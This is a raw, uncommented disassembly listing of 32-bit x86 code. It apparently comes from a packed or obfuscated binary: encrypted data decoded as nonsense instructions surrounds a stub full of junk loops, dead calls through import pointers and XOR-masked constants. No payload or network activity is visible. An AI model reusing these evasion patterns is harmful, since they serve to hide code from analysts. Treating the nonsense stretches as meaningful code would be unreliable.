  4140d4:	xchg   BYTE PTR [ecx+0x2a3e2df1],cl
  4140da:	sub    al,0x1a
  4140dc:	adc    DWORD PTR [edi+0x4673f69c],eax
  4140e2:	lods   eax,DWORD PTR ds:[esi]
  4140e3:	dec    esp
  4140e4:	fwait
  4140e5:	out    0x51,al
  4140e7:	mov    edi,0x77584357
  4140ec:	daa    
  4140ed:	jno    0x4140af
  4140ef:	sahf   
  4140f0:	cmp    eax,0x95568691
  4140f5:	and    eax,0x68a76dbf
  4140fa:	jp     0x41415a
  4140fc:	push   edi
  4140fd:	retf   
  4140fe:	fist   DWORD PTR [esi+esi*4+0x5dca6bdd]
  414105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414106:	dec    edi
  414107:	ins    DWORD PTR es:[edi],dx
  414108:	xor    DWORD PTR [edx-0x56],edi
  41410b:	in     al,0xbd
  41410d:	cmp    BYTE PTR [edx+0x1c4cdaed],bl
  414113:	int    0x20
  414115:	gs cli 
  414117:	aas    
  414118:	lahf   
  414119:	sar    DWORD PTR gs:[ebx-0x7a],1
  41411d:	mov    ebp,0x38cf1bf8
  414122:	icebp  
  414123:	or     esi,esi
  414125:	fistp  QWORD PTR [edi]
  414127:	cs sbb eax,0xa049fe06
  41412d:	xchg   DWORD PTR [esi+0x5d],edx
  414130:	mov    cs,WORD PTR [ebp+0x76dd1fe8]
  414136:	add    eax,0x6737704f
  41413b:	adc    eax,0x7378333a
  414140:	jmp    0xedc667a0
  414145:	clc    
  414146:	(bad)  [ebp-0x1]
  414149:	sbb    BYTE PTR [ebp-0xae9bff9],0x26
  414150:	inc    ecx
  414151:	dec    eax
  414152:	mov    ds:0x6da70070,al
  414157:	mov    bl,0x8b
  414159:	dec    ebp
  41415a:	call   0xa3f75660
  41415f:	inc    edx
  414160:	add    BYTE PTR [esi-0x48],dl
  414163:	test   al,0x8
  414165:	push   ecx
  414166:	pop    es
  414167:	sbb    DWORD PTR ds:0x42a3fa,0x2976
  414171:	xor    ecx,eax
  414173:	and    esi,DWORD PTR ds:0x42a406
  414179:	mov    esi,0x3272ef
  41417e:	push   edi
  41417f:	sbb    DWORD PTR ds:0x42a412,0x4902
  414189:	add    ecx,esi
  41418b:	mov    DWORD PTR ds:0x42a3ee,0x5bf5
  414195:	jmp    0x4141b9
  41419a:	mov    DWORD PTR ds:0x42a432,0x67c9
  4141a4:	mov    dl,BYTE PTR [ebp-0x1]
  4141a7:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4141ae:	mov    DWORD PTR ds:0x42a3fa,0x7173
  4141b8:	inc    ecx
  4141b9:	mov    DWORD PTR ds:0x42a3da,0x2657
  4141c3:	cmp    ecx,0x40
  4141c6:	jb     0x41419a
  4141cc:	mov    edx,DWORD PTR [ebp-0x18]
  4141cf:	sbb    DWORD PTR ds:0x42a41a,0x5717
  4141d9:	xor    edx,eax
  4141db:	add    edx,esi
  4141dd:	jmp    0x4142b9
  4141e2:	and    DWORD PTR ds:0x42a446,0x0
  4141ec:	mov    ecx,DWORD PTR ds:0x42a446
  4141f2:	inc    ecx
  4141f3:	mov    DWORD PTR ds:0x42a446,ecx
  4141f9:	cmp    DWORD PTR ds:0x42a446,0x18
  414200:	jb     0x414230
  414206:	jmp    0x414223
  41420b:	push   0x39f2
  414210:	push   0x1eb0
  414215:	push   0x8db9
  41421a:	push   DWORD PTR [ebp-0x1c]
  41421d:	call   DWORD PTR ds:0x42a50e
  414223:	cmp    DWORD PTR ds:0x42a446,0x11
  41422a:	jb     0x4141ec
  414230:	mov    edi,DWORD PTR [ebp+0x8]
  414233:	mov    ecx,0x8a96
  414238:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41423d:	and    DWORD PTR ds:0x42a42e,0x0
  414247:	mov    edi,DWORD PTR ds:0x42a42e
  41424d:	inc    edi
  41424e:	mov    DWORD PTR ds:0x42a42e,edi
  414254:	cmp    DWORD PTR ds:0x42a42e,0x21
  41425b:	jge    0x414280
  414261:	jmp    0x414273
  414266:	push   0x1
  414268:	push   0x1de7
  41426d:	call   DWORD PTR ds:0x42a512
  414273:	cmp    DWORD PTR ds:0x42a42e,0x18
  41427a:	jb     0x414247
  414280:	mov    edi,0x3b59
  414285:	add    cx,di
  414288:	movzx  ecx,cx
  41428b:	mov    DWORD PTR [ebp-0xc],ecx
  41428e:	adc    DWORD PTR ds:0x42a40e,edi
  414294:	mov    ecx,DWORD PTR [ebp+0x8]
  414297:	neg    DWORD PTR ds:0x42a3ca
  41429d:	movzx  ecx,WORD PTR [ecx+edx*4]
  4142a1:	xor    ecx,0x8a96
  4142a7:	add    ecx,edi
  4142a9:	mov    edi,0x7bd4
  4142ae:	mov    edi,DWORD PTR [ebp-0xc]
  4142b1:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  4142b8:	inc    edx
  4142b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4142bc:	mov    DWORD PTR ds:0x42a44e,0x7160
  4142c6:	cmp    edx,ecx
  4142c8:	jne    0x4141e2
  4142ce:	add    edx,DWORD PTR ds:0x42a3c2
  4142d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4142d7:	mov    edx,DWORD PTR [ebp+0x10]
  4142da:	add    DWORD PTR ds:0x42a3be,ecx
  4142e0:	xor    ecx,eax
  4142e2:	add    ecx,esi
  4142e4:	sub    edi,0x4ba6
  4142ea:	mov    DWORD PTR [edx],ecx
  4142ec:	and    DWORD PTR ds:0x42a3ba,0x0
  4142f6:	mov    edi,DWORD PTR ds:0x42a3ba
  4142fc:	inc    edi
  4142fd:	mov    DWORD PTR ds:0x42a3ba,edi
  414303:	cmp    DWORD PTR ds:0x42a3ba,0xa
  41430a:	jge    0x414354
  414310:	jmp    0x41432d
  414315:	push   0x5605
  41431a:	push   0x42a3ee
  41431f:	push   DWORD PTR [ebp-0x1c]
  414322:	push   0x6fb7
  414327:	call   DWORD PTR ds:0x42a546
  41432d:	cmp    DWORD PTR ds:0x42a3ba,0x9
  414334:	jne    0x414347
  41433a:	mov    edi,DWORD PTR ds:0x42a3ba
  414340:	inc    edi
  414341:	mov    DWORD PTR ds:0x42a3ba,edi
  414347:	cmp    DWORD PTR ds:0x42a3ba,0x14
  41434e:	jb     0x4142f6
  414354:	mov    ecx,DWORD PTR [ebp-0x18]
  414357:	adc    DWORD PTR ds:0x42a412,edx
  41435d:	xor    ecx,eax
  41435f:	and    DWORD PTR ds:0x42a416,0x0
  414369:	mov    edi,DWORD PTR ds:0x42a416
  41436f:	inc    edi
  414370:	mov    DWORD PTR ds:0x42a416,edi
  414376:	cmp    DWORD PTR ds:0x42a416,0x9
  41437d:	ja     0x4143c1
  414383:	jmp    0x414398
  414388:	push   0x6c58
  41438d:	push   0x42a3aa
  414392:	call   DWORD PTR ds:0x42a54a
  414398:	cmp    DWORD PTR ds:0x42a416,0x8
  41439f:	jne    0x4143b4
  4143a5:	xor    edi,edi
  4143a7:	add    edi,DWORD PTR ds:0x42a416
  4143ad:	inc    edi
  4143ae:	mov    DWORD PTR ds:0x42a416,edi
  4143b4:	cmp    DWORD PTR ds:0x42a416,0x14
  4143bb:	jb     0x414369
  4143c1:	add    ecx,esi
  4143c3:	mov    DWORD PTR [ebp-0xc],ecx
  4143c6:	and    DWORD PTR ds:0x42a44e,ebx
  4143cc:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  4143d3:	sbb    DWORD PTR ds:0x42a3f6,0x631a
  4143dd:	mov    DWORD PTR [ebp-0x14],0xf89c8589
  4143e4:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  4143eb:	mov    ecx,DWORD PTR [ebp-0x14]
  4143ee:	mov    DWORD PTR [ebp+0x8],ecx
  4143f1:	neg    ecx
  4143f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4143f6:	movzx  edi,BYTE PTR ds:0x42a43a
  4143fd:	sub    DWORD PTR ds:0x42a43e,edi
  414403:	xor    ecx,eax
  414405:	add    ecx,esi
  414407:	mov    ecx,0x242ebcd
  41440c:	mov    edi,0x2eb0
  414411:	mov    edi,0xf641bcc
  414416:	je     0x416e1f
  41441c:	and    DWORD PTR ds:0x42a3ce,0x0
  414426:	mov    ebx,DWORD PTR ds:0x42a3ce
  41442c:	inc    ebx
  41442d:	mov    DWORD PTR ds:0x42a3ce,ebx
  414433:	cmp    DWORD PTR ds:0x42a3ce,0x4
  41443a:	jl     0x414475
  414440:	jmp    0x41444e
  414445:	push   DWORD PTR [ebp-0x14]
  414448:	call   DWORD PTR ds:0x42a516
  41444e:	cmp    DWORD PTR ds:0x42a3ce,0x3
  414455:	jne    0x414468
  41445b:	mov    ebx,DWORD PTR ds:0x42a3ce
  414461:	inc    ebx
  414462:	mov    DWORD PTR ds:0x42a3ce,ebx
  414468:	cmp    DWORD PTR ds:0x42a3ce,0x19
  41446f:	jb     0x414426
  414475:	mov    edx,DWORD PTR [ebp+0x8]
  414478:	mov    ebx,DWORD PTR [ebp-0x8]
  41447b:	adc    DWORD PTR ds:0x42a3da,0x42a416
  414485:	xor    edx,eax
  414487:	xor    ebx,eax
  414489:	xor    DWORD PTR ds:0x42a3aa,0x6c23
  414493:	sub    edx,ebx
  414495:	sbb    DWORD PTR ds:0x42a402,0x57b9
  41449f:	sub    edx,esi
  4144a1:	xor    edx,eax
  4144a3:	movzx  ebx,WORD PTR ds:0x42a406
  4144aa:	sbb    DWORD PTR ds:0x42a432,ebx
  4144b0:	mov    DWORD PTR [ebp+0x8],edx
  4144b3:	mov    edx,DWORD PTR [ebp+0x8]
  4144b6:	and    DWORD PTR ds:0x42a42e,0x0
  4144c0:	xor    ebx,ebx
  4144c2:	xor    ebx,DWORD PTR ds:0x42a42e
  4144c8:	inc    ebx
  4144c9:	mov    DWORD PTR ds:0x42a42e,ebx
  4144cf:	cmp    DWORD PTR ds:0x42a42e,0x7
  4144d6:	jl     0x414516
  4144dc:	jmp    0x4144ef
  4144e1:	push   DWORD PTR [ebp-0x20]
  4144e4:	push   0x42a3d6
  4144e9:	call   DWORD PTR ds:0x42a55a
  4144ef:	cmp    DWORD PTR ds:0x42a42e,0x6
  4144f6:	jne    0x414509
  4144fc:	mov    ebx,DWORD PTR ds:0x42a42e
  414502:	inc    ebx
  414503:	mov    DWORD PTR ds:0x42a42e,ebx
  414509:	cmp    DWORD PTR ds:0x42a42e,0x14
  414510:	jb     0x4144c0
  414516:	mov    ebx,DWORD PTR [ebp-0x58]
  414519:	adc    DWORD PTR ds:0x42a3e6,0x1f0e
  414523:	add    edx,0x5708fa
  414529:	sub    DWORD PTR ds:0x42a3fa,0x42a426
  414533:	imul   edx,ebx
  414536:	and    DWORD PTR ds:0x42a41a,0x0
  414540:	mov    ebx,DWORD PTR ds:0x42a41a
  414546:	inc    ebx
  414547:	mov    DWORD PTR ds:0x42a41a,ebx
  41454d:	cmp    DWORD PTR ds:0x42a41a,0x22
  414554:	jb     0x41457d
  41455a:	jmp    0x414570
  41455f:	push   DWORD PTR [ebp-0x1c]
  414562:	push   DWORD PTR [ebp-0x1c]
  414565:	push   0x5112
  41456a:	call   DWORD PTR ds:0x42a55e
  414570:	cmp    DWORD PTR ds:0x42a41a,0x19
  414577:	jb     0x414540
  41457d:	mov    DWORD PTR [ebp-0x58],edx
  414580:	sbb    DWORD PTR ds:0x42a3f6,0x5e0b
  41458a:	mov    edx,DWORD PTR [ebp+0x8]
  41458d:	mov    ebx,DWORD PTR [ebp-0x54]
  414590:	and    DWORD PTR ds:0x42a44a,0x42a3ae
  41459a:	add    edx,0x64f89c
  4145a0:	add    DWORD PTR ds:0x42a3fe,0x23c2
  4145aa:	or     edx,ebx
  4145ac:	mov    DWORD PTR [ebp-0x54],edx
  4145af:	sbb    edx,edx
  4145b1:	mov    edx,DWORD PTR [ebp+0x8]
  4145b4:	add    ebx,DWORD PTR ds:0x42a446
  4145ba:	mov    ebx,DWORD PTR [ebp-0x50]
  4145bd:	mov    DWORD PTR ds:0x42a41a,0x1d36
  4145c7:	add    edx,ecx
  4145c9:	xor    edx,ebx
  4145cb:	mov    DWORD PTR [ebp-0x50],edx
  4145ce:	and    DWORD PTR ds:0x42a43e,0x0
  4145d8:	jmp    0x4145ea
  4145dd:	mov    edx,DWORD PTR ds:0x42a43e
  4145e3:	inc    edx
  4145e4:	mov    DWORD PTR ds:0x42a43e,edx
  4145ea:	cmp    DWORD PTR ds:0x42a43e,0x1d
  4145f1:	jae    0x414624
  4145f7:	cmp    DWORD PTR ds:0x42a43e,0x2d
  4145fe:	jbe    0x414624
  414604:	jmp    0x41461f
  414609:	push   DWORD PTR [ebp-0x14]
  41460c:	push   DWORD PTR [ebp-0x20]
  41460f:	push   0x1476
  414614:	push   0x4291d1
  414619:	call   DWORD PTR ds:0x42a51a
  41461f:	jmp    0x4145dd
  414624:	mov    edx,DWORD PTR [ebp+0x8]
  414627:	mov    ebx,DWORD PTR [ebp-0x4c]
  41462a:	adc    DWORD PTR ds:0x42a3ea,0x42a3ae
  414634:	add    edx,edi
  414636:	adc    DWORD PTR ds:0x42a3e2,0x5ee0
  414640:	and    edx,ebx
  414642:	mov    DWORD PTR [ebp-0x4c],edx
  414645:	neg    edx
  414647:	mov    edx,DWORD PTR [ebp+0x8]
  41464a:	mov    ebx,DWORD PTR [ebp-0x48]
  41464d:	lea    edx,[ebx+edx*1+0x241fcdf]
  414654:	mov    DWORD PTR [ebp-0x48],edx
  414657:	mov    ebx,DWORD PTR ds:0x42a4ba
  41465d:	mov    ebx,DWORD PTR [ebx]
  41465f:	and    DWORD PTR ds:0x42a44a,ebx
  414665:	mov    edx,DWORD PTR [ebp+0x8]
  414668:	mov    ebx,0xfa5e1530
  41466d:	mov    DWORD PTR ds:0x42a446,0x6c5b
  414677:	sub    ebx,edx
  414679:	add    ebx,DWORD PTR [ebp-0x44]
  41467c:	mov    DWORD PTR [ebp-0x44],ebx
  41467f:	sub    DWORD PTR ds:0x42a3d6,0x1976
  414689:	mov    edx,DWORD PTR [ebp+0x8]
  41468c:	xor    edx,eax
  41468e:	add    edx,esi
  414690:	mov    DWORD PTR ds:0x42a42a,0x7528
  41469a:	jne    0x41441c
  4146a0:	mov    DWORD PTR ds:0x42a426,0x7cb7
  4146aa:	jmp    0x416e1f
  4146af:	mov    DWORD PTR ds:0x42a3ce,0x1e
  4146b9:	cmp    DWORD PTR ds:0x42a3ce,0x0
  4146c0:	je     0x414725
  4146c6:	cmp    DWORD PTR ds:0x42a3ce,0xf
  4146cd:	ja     0x414725
  4146d3:	jmp    0x4146f9
  4146d8:	push   0x42a3de
  4146dd:	push   0x2937
  4146e2:	push   DWORD PTR [ebp-0x1c]
  4146e5:	push   DWORD PTR [ebp-0x20]
  4146e8:	push   DWORD PTR [ebp-0x14]
  4146eb:	push   DWORD PTR [ebp-0x1c]
  4146ee:	push   0x7ba5
  4146f3:	call   DWORD PTR ds:0x42a51e
  4146f9:	cmp    DWORD PTR ds:0x42a3ce,0x10
  414700:	jne    0x414713
  414706:	mov    ebx,DWORD PTR ds:0x42a3ce
  41470c:	dec    ebx
  41470d:	mov    DWORD PTR ds:0x42a3ce,ebx
  414713:	mov    ebx,DWORD PTR ds:0x42a3ce
  414719:	dec    ebx
  41471a:	mov    DWORD PTR ds:0x42a3ce,ebx
  414720:	jmp    0x4146b9
  414725:	mov    edx,DWORD PTR [ebp-0xc]
  414728:	sub    edx,esi
  41472a:	adc    DWORD PTR ds:0x42a412,ebx
  414730:	xor    edx,eax
  414732:	and    DWORD PTR ds:0x42a3fe,0x0
  41473c:	mov    ebx,DWORD PTR ds:0x42a3fe
  414742:	inc    ebx
  414743:	mov    DWORD PTR ds:0x42a3fe,ebx
  414749:	cmp    DWORD PTR ds:0x42a3fe,0xc
  414750:	ja     0x414791
  414756:	jmp    0x41476a
  41475b:	push   DWORD PTR [ebp-0x18]
  41475e:	push   DWORD PTR [ebp-0x1c]
  414761:	push   DWORD PTR [ebp-0x1c]
  414764:	call   DWORD PTR ds:0x42a562
  41476a:	cmp    DWORD PTR ds:0x42a3fe,0xb
  414771:	jne    0x414784
  414777:	mov    ebx,DWORD PTR ds:0x42a3fe
  41477d:	inc    ebx
  41477e:	mov    DWORD PTR ds:0x42a3fe,ebx
  414784:	cmp    DWORD PTR ds:0x42a3fe,0x18
  41478b:	jb     0x41473c
  414791:	mov    DWORD PTR [ebp-0x5c],edx
  414794:	sbb    DWORD PTR ds:0x42a432,ebx
  41479a:	mov    edx,DWORD PTR [ebp-0x10]
  41479d:	sub    DWORD PTR ds:0x42a3f2,0x55b5
  4147a7:	mov    ebx,DWORD PTR [ebp-0x8]
  4147aa:	xor    edx,eax
  4147ac:	xor    ebx,eax
  4147ae:	or     DWORD PTR ds:0x42a43a,0x4c86
  4147b8:	sub    edx,ebx
  4147ba:	sub    edx,esi
  4147bc:	and    DWORD PTR ds:0x42a42a,0x23d1
  4147c6:	xor    edx,eax
  4147c8:	mov    DWORD PTR [ebp-0x10],edx
  4147cb:	mov    edx,0x4ef4
  4147d0:	mov    edx,DWORD PTR [ebp-0x14]
  4147d3:	mov    DWORD PTR [ebp+0x8],edx
  4147d6:	jmp    0x41487b
  4147db:	and    DWORD PTR ds:0x42a3aa,ebx
  4147e1:	mov    edx,DWORD PTR [ebp+0x8]
  4147e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4147e7:	sub    DWORD PTR ds:0x42a3ae,0x69af
  4147f1:	xor    edx,eax
  4147f3:	adc    DWORD PTR ds:0x42a436,0x774b
  4147fd:	xor    ebx,eax
  4147ff:	add    DWORD PTR ds:0x42a40e,0x42a3aa
  414809:	sub    edx,ebx
  41480b:	not    DWORD PTR ds:0x42a3b6
  414811:	sub    edx,esi
  414813:	xor    edx,eax
  414815:	mov    DWORD PTR [ebp+0x8],edx
  414818:	sbb    DWORD PTR ds:0x42a422,edi
  41481e:	mov    edx,DWORD PTR [ebp+0x8]
  414821:	mov    ebx,DWORD PTR [ebp-0x58]
  414824:	add    edx,0x5708fa
  41482a:	imul   edx,ebx
  41482d:	mov    DWORD PTR [ebp-0x58],edx
  414830:	mov    edx,DWORD PTR [ebp+0x8]
  414833:	mov    ebx,DWORD PTR [ebp-0x54]
  414836:	add    edx,0x64f89c
  41483c:	or     edx,ebx
  41483e:	mov    DWORD PTR [ebp-0x54],edx
  414841:	mov    edx,DWORD PTR [ebp+0x8]
  414844:	mov    ebx,DWORD PTR [ebp-0x50]
  414847:	add    edx,ecx
  414849:	xor    edx,ebx
  41484b:	mov    DWORD PTR [ebp-0x50],edx
  41484e:	mov    edx,DWORD PTR [ebp+0x8]
  414851:	mov    ebx,DWORD PTR [ebp-0x4c]
  414854:	add    edx,edi
  414856:	and    edx,ebx
  414858:	mov    DWORD PTR [ebp-0x4c],edx
  41485b:	mov    edx,DWORD PTR [ebp+0x8]
  41485e:	mov    ebx,DWORD PTR [ebp-0x48]
  414861:	lea    edx,[ebx+edx*1+0x241fcdf]
  414868:	mov    DWORD PTR [ebp-0x48],edx
  41486b:	mov    edx,DWORD PTR [ebp+0x8]
  41486e:	mov    ebx,0xfa5e1530
  414873:	sub    ebx,edx
  414875:	add    ebx,DWORD PTR [ebp-0x44]
  414878:	mov    DWORD PTR [ebp-0x44],ebx
  41487b:	mov    edx,DWORD PTR [ebp+0x8]
  41487e:	xor    edx,eax
  414880:	add    edx,esi
  414882:	jne    0x4147db
  414888:	mov    edx,DWORD PTR [ebp-0xc]
  41488b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414892:	mov    bl,BYTE PTR [ebp-0x1]
  414895:	cmp    dl,bl
  414897:	je     0x414975
  41489d:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148a0:	mov    edx,DWORD PTR [ebp-0xc]
  4148a3:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148aa:	mov    ebx,DWORD PTR [ebp+0xc]
  4148ad:	xor    ecx,eax
  4148af:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ef]
  4148b6:	jne    0x416e31
  4148bc:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148bf:	mov    edx,DWORD PTR [ebp+0xc]
  4148c2:	xor    ecx,eax
  4148c4:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ef]
  4148cc:	mov    edx,DWORD PTR [ebp-0x18]
  4148cf:	xor    edx,eax
  4148d1:	add    edx,esi
  4148d3:	cmp    ecx,edx
  4148d5:	mov    ecx,DWORD PTR [ebp-0x14]
  4148d8:	mov    DWORD PTR [ebp+0x8],ecx
  4148db:	mov    ecx,DWORD PTR [ebp+0x8]
  4148de:	je     0x4192c1
  4148e4:	xor    ecx,eax
  4148e6:	add    ecx,esi
  4148e8:	mov    ecx,0x242ebcd
  4148ed:	je     0x4149fd
  4148f3:	mov    edx,DWORD PTR [ebp+0x8]
  4148f6:	mov    ebx,DWORD PTR [ebp-0x8]
  4148f9:	xor    edx,eax
  4148fb:	xor    ebx,eax
  4148fd:	sub    edx,ebx
  4148ff:	sub    edx,esi
  414901:	xor    edx,eax
  414903:	mov    DWORD PTR [ebp+0x8],edx
  414906:	mov    edx,DWORD PTR [ebp+0x8]
  414909:	mov    ebx,DWORD PTR [ebp-0x58]
  41490c:	add    edx,0x5708fa
  414912:	imul   edx,ebx
  414915:	mov    DWORD PTR [ebp-0x58],edx
  414918:	mov    edx,DWORD PTR [ebp+0x8]
  41491b:	mov    ebx,DWORD PTR [ebp-0x54]
  41491e:	add    edx,0x64f89c
  414924:	or     edx,ebx
  414926:	mov    DWORD PTR [ebp-0x54],edx
  414929:	mov    edx,DWORD PTR [ebp+0x8]
  41492c:	mov    ebx,DWORD PTR [ebp-0x50]
  41492f:	add    edx,ecx
  414931:	xor    edx,ebx
  414933:	mov    DWORD PTR [ebp-0x50],edx
  414936:	mov    edx,DWORD PTR [ebp+0x8]
  414939:	mov    ebx,DWORD PTR [ebp-0x4c]
  41493c:	add    edx,edi
  41493e:	and    edx,ebx
  414940:	mov    DWORD PTR [ebp-0x4c],edx
  414943:	mov    edx,DWORD PTR [ebp+0x8]
  414946:	mov    ebx,DWORD PTR [ebp-0x48]
  414949:	lea    edx,[ebx+edx*1+0x241fcdf]
  414950:	mov    DWORD PTR [ebp-0x48],edx
  414953:	mov    edx,DWORD PTR [ebp+0x8]
  414956:	mov    ebx,0xfa5e1530
  41495b:	sub    ebx,edx
  41495d:	add    ebx,DWORD PTR [ebp-0x44]
  414960:	mov    DWORD PTR [ebp-0x44],ebx
  414963:	mov    edx,DWORD PTR [ebp+0x8]
  414966:	xor    edx,eax
  414968:	add    edx,esi
  41496a:	jne    0x4148f3
  414970:	jmp    0x4149fd
  414975:	mov    edx,DWORD PTR [ebp-0x14]
  414978:	mov    DWORD PTR [ebp+0x8],edx
  41497b:	jmp    0x4149f0
  414980:	mov    edx,DWORD PTR [ebp+0x8]
  414983:	mov    ebx,DWORD PTR [ebp-0x8]
  414986:	xor    edx,eax
  414988:	xor    ebx,eax
  41498a:	sub    edx,ebx
  41498c:	sub    edx,esi
  41498e:	xor    edx,eax
  414990:	mov    DWORD PTR [ebp+0x8],edx
  414993:	mov    edx,DWORD PTR [ebp+0x8]
  414996:	mov    ebx,DWORD PTR [ebp-0x58]
  414999:	add    edx,0x5708fa
  41499f:	imul   edx,ebx
  4149a2:	mov    DWORD PTR [ebp-0x58],edx
  4149a5:	mov    edx,DWORD PTR [ebp+0x8]
  4149a8:	mov    ebx,DWORD PTR [ebp-0x54]
  4149ab:	add    edx,0x64f89c
  4149b1:	or     edx,ebx
  4149b3:	mov    DWORD PTR [ebp-0x54],edx
  4149b6:	mov    edx,DWORD PTR [ebp+0x8]
  4149b9:	mov    ebx,DWORD PTR [ebp-0x50]
  4149bc:	add    edx,ecx
  4149be:	xor    edx,ebx
  4149c0:	mov    DWORD PTR [ebp-0x50],edx
  4149c3:	mov    edx,DWORD PTR [ebp+0x8]
  4149c6:	mov    ebx,DWORD PTR [ebp-0x4c]
  4149c9:	add    edx,edi
  4149cb:	and    edx,ebx
  4149cd:	mov    DWORD PTR [ebp-0x4c],edx
  4149d0:	mov    edx,DWORD PTR [ebp+0x8]
  4149d3:	mov    ebx,DWORD PTR [ebp-0x48]
  4149d6:	lea    edx,[ebx+edx*1+0x241fcdf]
  4149dd:	mov    DWORD PTR [ebp-0x48],edx
  4149e0:	mov    edx,DWORD PTR [ebp+0x8]
  4149e3:	mov    ebx,0xfa5e1530
  4149e8:	sub    ebx,edx
  4149ea:	add    ebx,DWORD PTR [ebp-0x44]
  4149ed:	mov    DWORD PTR [ebp-0x44],ebx
  4149f0:	mov    edx,DWORD PTR [ebp+0x8]
  4149f3:	xor    edx,eax
  4149f5:	add    edx,esi
  4149f7:	jne    0x414980
  4149fd:	mov    edx,DWORD PTR [ebp-0x14]
  414a00:	mov    DWORD PTR [ebp+0x8],edx
  414a03:	jmp    0x416e00
  414a08:	jmp    0x416d90
  414a0d:	push   eax
  414a0e:	and    BYTE PTR [edi+0x7d18fda],cl
  414a14:	mov    al,ds:0x672ec4b9
  414a19:	jnp    0x4149e8
  414a1b:	cmp    BYTE PTR [ecx+0x7a796642],cl
  414a21:	pop    ss
  414a22:	pop    edi
  414a23:	jp     0x414a9f
  414a25:	push   es
  414a26:	jge    0x4149f9
  414a28:	adc    ebp,DWORD PTR [ecx-0x1e]
  414a2b:	mov    ds:0xaacf8299,al
  414a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a31:	fidivr WORD PTR [ecx+0x28]
  414a34:	mov    ch,0x3f
  414a36:	push   ebx
  414a37:	sbb    al,0x2c
  414a39:	inc    edi
  414a3a:	cdq    
  414a3b:	xchg   al,bl
  414a3d:	stc    
  414a3e:	cld    
  414a3f:	add    ch,BYTE PTR [esi+0x62]
  414a42:	dec    eax
  414a43:	out    0x80,al
  414a45:	pop    esp
  414a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a47:	popa   
  414a48:	cmp    al,0x50
  414a4a:	inc    esi
  414a4b:	or     esi,DWORD PTR [esi+ebx*4-0x5382ddf5]
  414a52:	mov    ds:0xcdeb73bd,eax
  414a57:	inc    eax
  414a58:	addr16 xor eax,0xd2471328
  414a5e:	out    dx,al
  414a5f:	bound  eax,QWORD PTR cs:[eax-0x5b800e1f]
  414a66:	pusha  
  414a67:	pop    ds
  414a68:	adc    ecx,DWORD PTR [ebp-0x43b6f735]
  414a6e:	inc    BYTE PTR [esi]
  414a70:	push   cs
  414a71:	retf   
  414a72:	cmp    al,0x3c
  414a74:	jge    0x414a7f
  414a76:	ins    BYTE PTR es:[edi],dx
  414a77:	xor    ah,ch
  414a79:	push   ss
  414a7a:	mov    edx,0xf5518c29
  414a7f:	outs   dx,DWORD PTR ds:[esi]
  414a80:	scas   al,BYTE PTR es:[edi]
  414a81:	mov    esi,0x25de86ef
  414a86:	pop    ebx
  414a87:	mov    ds:0x1cb0d065,eax
  414a8c:	mov    esp,0x2ecb1a4c
  414a91:	and    cl,bh
  414a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a94:	sub    edx,DWORD PTR [edx-0x237c47a1]
  414a9a:	ret    0xcf9a
  414a9d:	cwde   
  414a9e:	call   0xa105792
  414aa3:	add    ebx,DWORD PTR [edx]
  414aa5:	test   BYTE PTR ds:0xc79adbd4,bl
  414aab:	popf   
  414aac:	nop
  414aad:	adc    edi,esp
  414aaf:	jp     0x414a3c
  414ab1:	pop    ebp
  414ab2:	xor    al,0x77
  414ab4:	ds jns 0x414a89
  414ab7:	mov    fs,WORD PTR [esi-0x4cd46b38]
  414abd:	es xchg esi,eax
  414abf:	xchg   ebp,eax
  414ac0:	js     0x414a4e
  414ac2:	or     eax,0x24283aef
  414ac7:	sub    eax,0x6cbffb8f
  414acc:	add    ecx,ebp
  414ace:	jno    0x414add
  414ad0:	bound  edx,QWORD PTR [eax-0x22]
  414ad3:	in     eax,dx
  414ad4:	ss xchg edx,esi
  414ad7:	push   ebp
  414ad8:	jo     0x414aa2
  414ada:	ss (bad) 
  414adc:	lds    edi,FWORD PTR [ebp-0x80]
  414adf:	xor    eax,DWORD PTR [edi-0x4c]
  414ae2:	add    DWORD PTR [esi],ebp
  414ae4:	add    cl,BYTE PTR [eax-0xe]
  414ae7:	sbb    al,dh
  414ae9:	jns    0x414b49
  414aeb:	pushf  
  414aec:	neg    BYTE PTR [ebx+0x7b]
  414aef:	pop    esp
  414af0:	cmp    BYTE PTR [esi-0x18],bl
  414af3:	pop    ebx
  414af4:	adc    esp,DWORD PTR [eax+0x7011cc55]
  414afa:	mov    dl,BYTE PTR [ebx+0x39a249a3]
  414b00:	sbb    eax,0x7d5bb83f
  414b05:	ins    BYTE PTR es:[edi],dx
  414b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b07:	pushf  
  414b08:	pop    ds
  414b09:	xor    BYTE PTR [esi],al
  414b0b:	xor    BYTE PTR [esi],dh
  414b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0e:	xchg   DWORD PTR [eax+0x7b],eax
  414b11:	fsub   QWORD PTR [ebp-0x109db73c]
  414b17:	retf   
  414b18:	dec    ecx
  414b19:	nop
  414b1a:	pop    ds
  414b1b:	sbb    eax,0x7b1efe97
  414b20:	mov    ds:0xef2769df,al
  414b25:	popa   
  414b26:	scas   al,BYTE PTR es:[edi]
  414b27:	sbb    DWORD PTR [eax+0x775be4cc],ebx
  414b2d:	mov    esi,DWORD PTR cs:[edi+esi*8+0x3e]
  414b32:	test   DWORD PTR [ebx+0x40],edx
  414b35:	inc    esi
  414b36:	mov    esi,0xad064956
  414b3b:	cmc    
  414b3c:	mov    dh,0xad
  414b3e:	ins    DWORD PTR es:[edi],dx
  414b3f:	fdiv   st,st(6)
